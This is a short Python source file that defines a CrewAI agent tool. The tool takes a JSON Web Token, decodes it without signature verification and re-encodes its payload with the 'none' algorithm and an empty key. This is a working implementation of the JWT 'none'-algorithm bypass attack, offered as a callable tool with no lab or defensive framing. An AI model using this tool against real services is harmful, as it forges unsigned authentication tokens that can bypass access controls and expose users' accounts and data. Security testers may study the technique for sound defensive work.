from crewai_tools import BaseTool
import jwt


class JwtManipulationTool(BaseTool):
    name: str = "JWT Manipulation Tool" 
    description: str = (
        "Manipulate the given JWT to add 'none' algorithm."
    )

    def _run(self, token: str) -> str:
         # Decode the JWT without verifying the signature
        decoded_payload = jwt.decode(token, options={"verify_signature": False})

        # Create a new header with the algorithm set to 'none'
        new_header = {
            "alg": "none",
            "typ": "JWT"
        }

        # Encode the JWT with the new header and the original payload, using the 'none' algorithm
        modified_token = jwt.encode(
            payload=decoded_payload,
            key="",
            algorithm="none",
            headers=new_header
        )
        
        return modified_token

